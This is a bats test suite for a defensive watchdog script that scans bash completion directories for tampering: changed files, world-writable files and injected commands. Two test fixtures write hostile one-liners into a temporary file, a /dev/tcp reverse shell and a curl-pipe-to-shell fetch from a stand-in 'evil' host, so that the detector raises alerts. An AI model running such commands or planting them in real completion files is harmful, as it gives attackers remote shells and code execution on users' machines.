#!/usr/bin/env bats
# L2 bats functional tests for the bash-completion-watchdog scan script.
#
# Files in /etc/bash_completion.d (and the XDG completion dirs) are SOURCED
# into every interactive bash login — a per-login root-or-user exec surface.
# A planted completion file that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert (T1546).
#
# Run with: bats packaging/test/L2-bash-completion-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/bash-completion-watchdog/systemd/bash-completion-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/bash_completion.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BASHCOMP_PROFILE="${PROFILE:-report}" \
    SELFDEF_BASHCOMP_BASELINE="${BASELINE}" \
    SELFDEF_BASHCOMP_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/bash\ncomplete -W "start stop" mytool\n' > "${HOOKD}/mytool"
}

@test "no bash-completion dir → ok / no_bash_completion" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_bash_completion"'
    cap | grep -q '"severity":"ok"'
}

@test "benign completion, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged completion on second run → ok / bash_completion_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a completion file with an injection pattern → alert / bash_completion_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"bash_completion_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable completion file → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign completion change → warn / bash_completion_changed" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncomplete -W "start stop restart" mytool\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"bash_completion_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned completion file is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious completion file" {
    seed_benign
    run_wd
    printf '#!/bin/bash\ncurl http://evil/p|sh\n' > "${HOOKD}/mytool"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
